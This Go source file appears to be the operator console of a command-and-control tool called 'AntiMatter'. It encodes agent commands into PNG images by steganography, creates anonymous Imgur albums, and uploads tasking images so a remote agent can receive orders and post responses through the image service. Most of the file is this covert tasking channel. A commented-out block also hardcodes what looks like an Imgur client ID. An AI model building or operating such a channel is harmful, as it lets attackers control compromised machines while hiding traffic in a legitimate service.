package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"image/png"
	"io/ioutil"
	"mime/multipart"
	//"mime/multipart"
	//"log"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"

	stego "github.com/auyer/steganography"
	"github.com/fatih/color"
	"github.com/manifoldco/promptui"
)

// Album is a type to handle the album creation
type Album struct {
	deleteHash string
	albumID    string
}

// validateOptions is a function that just helps check to make sure you're choosing a correct option
func validateOptions(slice []string, val string) bool {
	for _, item := range slice {
		if strings.EqualFold(item, val) {
			return true
		}
	}
	return false
}

// Global map for the Image module
var imageOptions = map[string]string{"Command": "", "BaseImage": "", "NewFilename": "", "ClientID": "", "AlbumID": ""}

// Global map for the Album module
var albumOptions = map[string]string{"Title": "", "Client-ID": "", "AlbumID": "", "Delete-Hash": ""}

// Global map for the Task module
var taskOptions = map[string]string{"TaskingImage": "", "Title": "", "Description": "", "ClientID": ""}

// createImage is a function that uses the stego lib to encode an image you define and then write it to a new image
func createImage(command string, origPic string, newPic string) {
	inFile, _ := os.Open(origPic)
	reader := bufio.NewReader(inFile)
	img, _ := png.Decode(reader)

	w := new(bytes.Buffer)
	err := stego.Encode(w, img, []byte(command))
	if err != nil {
		fmt.Printf("Error encoding file %v", err)
	} else {
		fmt.Println(color.GreenString("\n[+]"), "Success creating encoded image!\n")

	}

	outFile, _ := os.Create(newPic)
	w.WriteTo(outFile)
	outFile.Close()

}

// createAlbum queries the Imgur API in order to create an anonymous album, using a client ID
func createAlbum(title string, clientID string) (albumID, deleteHash interface{}) {

	apiURL := "https://api.imgur.com"
	resource := "/3/album/"
	data := url.Values{}
	data.Set("title", title)

	u, _ := url.ParseRequestURI(apiURL)
	u.Path = resource
	urlStr := u.String() // "https://api.com/user/"

	client := &http.Client{}
	r, _ := http.NewRequest("POST", urlStr, strings.NewReader(data.Encode())) // URL-encoded payload
	r.Header.Add("Authorization", "Client-ID "+clientID)
	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))

	resp, _ := client.Do(r)
	var result map[string]interface{}

	json.NewDecoder(resp.Body).Decode(&result)

	nestedMap := result["data"]
	newMap, _ := nestedMap.(map[string]interface{})

	albumID = newMap["id"]
	deleteHash = newMap["deletehash"]

	fmt.Println(color.GreenString("\n[+]"), "Successfully created an album with the following values:")
	fmt.Println(color.GreenString("albumID:"), albumID, color.GreenString("deletehash:"), deleteHash, "\n")

	return albumID, deleteHash

}

func uploadImage(imageFile string, title string, description string, clientID string) {
	url := "https://api.imgur.com/3/image"
	method := "POST"
	var params = map[string]string{"image": imageFile, "title": title, "description": description}

	payload := &bytes.Buffer{}
	writer := multipart.NewWriter(payload)

	// This for loop is to send multiple multipart parameters, that are mapped above
	for key, val := range params {
		_ = writer.WriteField(key, val)
	}

	err := writer.Close()
	if err != nil {
		fmt.Println(err)
	}

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)

	if err != nil {
		fmt.Println(err)
	}
	req.Header.Add("Authorization", "Client-ID "+clientID)

	req.Header.Set("Content-Type", writer.FormDataContentType())
	res, err := client.Do(req)
	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)

	fmt.Println(string(body))

}

// This is a mess, defines way too much. Defines everything needed for the promptui
// Defines different options to choose for an operator
// Handles the user defined varibles and stores them in a global map
func main() {
	for {
		options := []string{"Options", "Image", "Album", "Agent", "Task", "List", "Delete", "Response", "Exit", "Quit", "testHttp"}
		validate := func(input string) error {
			// _, err := strconv.ParseFloat(input, 64)
			found := validateOptions(options, input)

			if !found {
				return errors.New("Invalid Option")
			}

			return nil
		}

		// Each template displays the data received from the prompt with some formatting.
		templates := &promptui.PromptTemplates{
			Prompt:  "{{ . }} ",
			Valid:   "{{ . | green }} ",
			Invalid: "{{ . | red }} ",
			Success: "{{ . | cyan }} ",
		}

		prompt := promptui.Prompt{
			Label:     "AntiMatter >",
			Templates: templates,
			Validate:  validate,
		}

		result, err := prompt.Run()

		if err != nil {
			fmt.Printf("Prompt failed %v\n", err)
			return
		}

		//fmt.Printf("You chose %q\n", result)

		if strings.EqualFold(result, "options") {
			fmt.Println("")
			fmt.Println("Valid Commands		Description")
			fmt.Println("---------------         ------------") // Literally just aethetic
			fmt.Println("\n")
			fmt.Println(" Image		Create an Image for agent tasking")
			fmt.Println(" Album		Create an Album for agent responses")
			fmt.Println(" Task		Create Tasking for agent")
			fmt.Println(" List		List images, albums, agents, and tasks")
			fmt.Println(" Exit		Exit program")
			fmt.Println("")
		}

		if strings.EqualFold(result, "exit") {
			os.Exit(0)
		}

		if strings.EqualFold(result, "Image") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Image > ")
				color.Unset()
				text, _ := reader.ReadString('\n')

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println("\n---OPTIONS---")
					// Check to see if this value is set from the Album module
					if val, ok := albumOptions["Client-ID"]; ok {
						imageOptions["ClientId"] = val
					}
					if val, ok := albumOptions["AlbumID"]; ok {
						imageOptions["AlbumId"] = val
					}
					for key, value := range imageOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}
					fmt.Println("\n")
				} else if strings.Contains(text, "set") {
					if strings.Contains(text, "command") {
						command := strings.Split(text, "command ")
						imageOptions["Command"] = strings.Replace(strings.Join(command[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "base-image") {
						baseImage := strings.Split(text, "base-image ")
						imageOptions["BaseImage"] = strings.Replace(strings.Join(baseImage[1:], ""), "\n", "", -1)
					} else if strings.Contains(text, "new-filename") {
						newFilename := strings.Split(text, "new-filename ")
						imageOptions["NewFilename"] = strings.Replace(strings.Join(newFilename[1:], ""), "\n", "", -1)
					} else if strings.Contains(text, "client-id") {
						clientID := strings.Split(text, "client-id ")
						imageOptions["ClientId"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)
					} else if strings.Contains(text, "album-id") {
						albumID := strings.Split(text, "album-id ")
						imageOptions["AlbumId"] = strings.Replace(strings.Join(albumID[1:], ""), "\n", "", -1)
					}

				} else if strings.Contains(text, "go") {
					createImage(imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])

				} else if strings.Contains(text, "exit") {
					break
				}

			}
		}
		/*
			if strings.EqualFold(result, "testHttp") {
				albumID, deleteHash := createAlbum("test", "bc8c890066d6157")
				fmt.Println(color.GreenString("[+]"), "Successfully created an album with the following values:")
				fmt.Println(color.GreenString("albumID:"), albumID, color.GreenString("deletehash:"), deleteHash)

			}
		*/

		if strings.EqualFold(result, "Album") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Album > ")
				color.Unset()
				// Had to do this since case sensitivity is dumb in golang
				initialText, _ := reader.ReadString('\n')
				text := strings.ToLower(initialText)

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println("\n---OPTIONS---")
					// Check to see if this value was set in the Image module
					if val, ok := imageOptions["ClientId"]; ok {
						albumOptions["Client-ID"] = val
					}
					// Check to see if this value was set in the Image module
					if val, ok := imageOptions["AlbumId"]; ok {
						albumOptions["AlbumID"] = val
					}

					for key, value := range albumOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}

					fmt.Println("\n")
				} else if strings.Contains(text, "set") {
					if strings.Contains(text, "title") {
						title := strings.Split(text, "title ")
						albumOptions["Title"] = strings.Replace(strings.Join(title[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "client-id") {
						clientID := strings.Split(text, "client-id ")
						albumOptions["Client-ID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)
					}

				} else if strings.Contains(text, "list") {
					fmt.Println(color.CyanString("AlbumHash:"), albumOptions["Delete-Hash"], "|", color.CyanString("Album ID:"), albumOptions["AlbumID"])

				} else if strings.Contains(text, "go") {
					albumID, deletehash := createAlbum(albumOptions["Title"], albumOptions["Client-ID"])
					albumOptions["AlbumID"] = albumID.(string)
					albumOptions["Delete-Hash"] = deletehash.(string)

				} else if strings.Contains(text, "exit") {
					break
				}

			}

		}
		if strings.EqualFold(result, "Task") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Task > ")
				color.Unset()
				// Had to do this since case sensitivity is dumb in golang
				initialText, _ := reader.ReadString('\n')
				text := strings.ToLower(initialText)

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println("\n---OPTIONS---")

					// Check to see if this value was set in the Image module
					if val, ok := imageOptions["ClientId"]; ok {
						taskOptions["ClientID"] = val
					}

					for key, value := range taskOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}
					fmt.Println("\n")
					// var taskOptions = map[string]string{"TaskingImage": "", "Title": "", "Description": "", "ClientID": ""}
					// func uploadImage(imageFile string, title string, description string, clientID string)
				} else if strings.Contains(text, "set") {
					if strings.Contains(text, "title") {
						taskTitle := strings.Split(text, "title ")
						taskOptions["Title"] = strings.Replace(strings.Join(taskTitle[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "tasking-image") {

						taskImage := strings.Split(text, "tasking-image ")

						// Open local image file
						f, _ := os.Open("./" + strings.Replace(strings.Join(taskImage[1:], ""), "\n", "", -1))

						reader := bufio.NewReader(f)
						content, _ := ioutil.ReadAll(reader)
						// Convert image file data to base64
						encoded := base64.StdEncoding.EncodeToString(content)
						taskOptions["TaskingImage"] = encoded

					} else if strings.Contains(text, "description") {
						taskDescrip := strings.Split(text, "description ")
						taskOptions["Description"] = strings.Replace(strings.Join(taskDescrip[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "client-id") {
						clientID := strings.Split(text, "client-id ")
						taskOptions["ClientID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)

					}

				} else if strings.Contains(text, "go") {
					uploadImage(taskOptions["TaskingImage"], taskOptions["Title"], taskOptions["Description"], taskOptions["ClientID"])

				} else if strings.Contains(text, "exit") {
					break
				}

			}

		}
		if strings.EqualFold(result, "") {
		}
		if strings.EqualFold(result, "") {
		}
		if strings.EqualFold(result, "") {
		}
	}
}
